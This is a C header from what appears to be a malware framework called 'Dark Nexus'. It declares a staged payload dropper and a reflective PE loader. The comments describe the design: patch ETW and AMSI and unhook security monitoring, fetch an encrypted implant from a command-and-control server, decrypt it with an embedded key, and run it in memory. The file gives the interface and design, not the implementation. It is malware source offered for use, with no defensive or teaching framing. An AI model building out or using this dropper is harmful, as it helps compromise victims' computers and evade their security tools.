#ifndef DN_STAGED_H
#define DN_STAGED_H

#include <windows.h>

/*
 * Dark Nexus - Staged Payload Dropper
 *
 * Minimal footprint binary that:
 *   1. Initializes evasion layer (syscalls, unhook, ETW/AMSI patches)
 *   2. Fetches full implant payload from C2 via HTTPS
 *   3. AES-256-GCM decrypts the payload using the embedded PSK
 *   4. Reflective-loads the PE into memory and executes it
 *
 * The C2 serves the encrypted PE on a staging URI (derived from checkin URI).
 * Wire format matches the standard Dark Nexus envelope:
 *   [12-byte nonce][ciphertext][16-byte GCM tag]
 */

// Stage the full implant: fetch, decrypt, load, execute.
// Returns FALSE if any step fails (the process should exit on failure).
BOOL dn_stage_and_execute(void);

// Reflective PE loader: maps a raw PE into memory and calls its entry point.
// pe_data: pointer to raw PE bytes (MZ header)
// pe_size: size in bytes
// Returns the PE base address on success, NULL on failure.
PVOID dn_reflective_load(const BYTE* pe_data, DWORD pe_size);

#endif // DN_STAGED_H
